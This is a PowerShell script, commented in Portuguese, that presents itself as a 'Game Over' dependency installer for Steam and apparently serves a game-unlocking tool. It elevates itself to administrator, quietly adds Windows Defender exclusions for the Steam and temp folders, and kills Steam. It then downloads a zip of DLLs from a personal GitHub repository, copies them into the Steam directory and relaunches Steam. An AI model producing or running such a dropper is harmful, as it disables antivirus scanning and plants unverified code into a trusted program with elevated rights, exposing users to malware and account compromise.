# ===== CONFIGURAÇÃO DE AMBIENTE =====
$OutputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$Host.UI.RawUI.WindowTitle = "Game Over - Instalador de Dependências"
Clear-Host

# ===== ELEVAÇÃO PARA ADMINISTRADOR =====
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb RunAs -ArgumentList $arguments
    Break
}

function Log {
    param ([string]$Type, [string]$Message)
    $Type = $Type.ToUpper()
    $date = Get-Date -Format "HH:mm:ss"
    Write-Host "[$date] [$Type] $Message" -ForegroundColor Cyan
}

# ===== DETECÇÃO DA STEAM =====
function Find-SteamPath {
    $PossiblePaths = @()
    try { $reg = Get-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue; if ($reg.InstallPath) { $PossiblePaths += $reg.InstallPath } } catch {}
    try { $reg = Get-ItemProperty -Path "HKCU:\Software\Valve\Steam" -ErrorAction SilentlyContinue; if ($reg.SteamPath) { $PossiblePaths += $reg.SteamPath -replace '\\\\', '\' } } catch {}
    if (Test-Path "C:\Program Files (x86)\Steam") { $PossiblePaths += "C:\Program Files (x86)\Steam" }
    $PossiblePaths = $PossiblePaths | Select-Object -Unique | Where-Object { Test-Path $_ }
    if ($PossiblePaths.Count -eq 0) { Log "ERR" "Steam nao encontrada."; exit 1 }
    return $PossiblePaths[0]
}

$steamDir = Find-SteamPath
$configDir = Join-Path $steamDir "config"
$luaDir = Join-Path $configDir "lua"

# ===== CONFIGURAÇÕES DE SEGURANÇA =====
Log "INFO" "Configurando exceções de segurança..."
try {
    Add-MpPreference -ExclusionPath $steamDir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath "C:\GameOver_Download_Tmp" -ErrorAction SilentlyContinue
} catch { Log "WARN" "Não foi possível aplicar exceções." }

# ===== EXECUÇÃO DA INSTALAÇÃO =====
Log "INFO" "Iniciando preparação de ambiente..."

# 1. Criar pasta lua
if (-not (Test-Path $luaDir)) { 
    New-Item -ItemType Directory -Path $luaDir | Out-Null
    Log "OK" "Pasta 'lua' criada em $luaDir"
}

# 2. Fechar Steam
Get-Process steam, steamwebhelper -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2

# 3. Download e Instalação de DLLs
$tmp = "C:\GameOver_Download_Tmp"
if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $tmp | Out-Null

$zipDlls = Join-Path $tmp "Pack.zip"
$urlDLLs = "https://github.com/master18032008/packzip/raw/refs/heads/main/Pack.zip"

Log "INFO" "Baixando dependencias..."
try {
    Invoke-WebRequest -Uri $urlDLLs -OutFile $zipDlls -UseBasicParsing -ErrorAction Stop
    
    $tmpDlls = Join-Path $tmp "ExtraidoDLLs"
    Expand-Archive -Path $zipDlls -DestinationPath $tmpDlls -Force -ErrorAction Stop
    
    Get-ChildItem -Path $tmpDlls -Recurse -Filter "*.dll" | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination $steamDir -Force
    }
    Log "OK" "DLLs instaladas com sucesso!"
} catch {
    Log "ERR" "Falha ao instalar DLLs: $($_.Exception.Message)"
}

# 4. Limpeza e Finalização
if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }

Log "OK" "Instalação concluída com sucesso."
$exe = Join-Path $steamDir "steam.exe"
if (Test-Path $exe) { Start-Process $exe -ArgumentList "-clearbeta" }

# O script encerra aqui e a janela fecha automaticamente
exit 0
